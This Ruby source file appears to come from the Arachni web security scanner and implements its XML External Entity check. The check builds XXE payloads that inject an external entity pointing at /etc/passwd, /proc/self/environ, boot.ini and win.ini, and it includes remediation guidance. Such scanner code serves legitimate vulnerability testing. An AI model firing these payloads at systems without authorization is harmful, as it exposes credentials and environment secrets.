=begin
    Copyright 2010-2017 Sarosys LLC <http://www.sarosys.com>

    This file is part of the Arachni Framework project and is subject to
    redistribution and commercial restrictions. Please see the Arachni Framework
    web site for more information on licensing and terms of use.
=end

# @author Tasos "Zapotek" Laskos <tasos.laskos@arachni-scanner.com>
class Arachni::Checks::Xxe < Arachni::Check::Base

    ENTITY = 'xxe_entity'

    def self.options
        @options ||= {
            format:        [Format::STRAIGHT],
            signatures:    FILE_SIGNATURES_PER_PLATFORM.select { |k, _| payloads.include? k },
            each_mutation: proc do |mutation|
                mutation.platforms.pick( payloads ).map do |platform, payloads|
                    payloads.map do |payload|
                        m = mutation.dup

                        m.transform_xml do |xml|
                            xml.sub( m.affected_input_value, "&#{ENTITY};" )
                        end

                        m.audit_options[:platform] = platform
                        m.source = "<!DOCTYPE #{ENTITY} [ <!ENTITY #{ENTITY} SYSTEM \"#{payload}\"> ]>\n#{m.source}"
                        m
                    end
                end
            end
        }
    end

    def self.payloads
        @payloads ||= {
            unix:    [
                '/proc/self/environ',
                '/etc/passwd'
            ],
            windows: [
                '%SYSTEMDRIVE%\boot.ini',
                '%WINDIR%\win.ini'
            ]
        }
    end

    def run
        # We can't inject entities because they're going to get sanitized,
        # instead we inject a placeholder which we can later replace via a
        # regular text substitution.
        audit random_seed, self.class.options
    end

    def self.info
        {
            name:        'XML External Entity',
            description: %q{
Injects a custom External Entity into XML documents prior to submitting them and
determines the existence of a vulnerability by checking whether that entity was
processed based on the resulting HTTP response.
},
            elements:    [Element::XML],
            author:      'Tasos "Zapotek" Laskos <tasos.laskos@arachni-scanner.com>',
            version:     '0.1.2',
            platforms:   options[:signatures].keys,

            issue:       {
                name:            %q{XML External Entity},
                description:     %q{
An XML External Entity attack is a type of attack against an application that
parses XML input.

This attack occurs when XML input containing a reference to an external entity is
processed by a weakly configured XML parser.

This attack may lead to the disclosure of confidential data, denial of service,
port scanning from the perspective of the machine where the parser is located,
and other system impacts.
},
                references:      {
                    'OWASP' => 'https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing'
                },
                cwe:             611,
                severity:        Severity::HIGH,
                remedy_guidance: %q{
Since the whole XML document is communicated from an untrusted client, it's not
usually possible to selectively validate or escape tainted data within the system
identifier in the DTD.

Therefore, the XML processor should be configured to use a local static DTD and
disallow any declared DTD included in the XML document.
}
            }
        }
    end

end
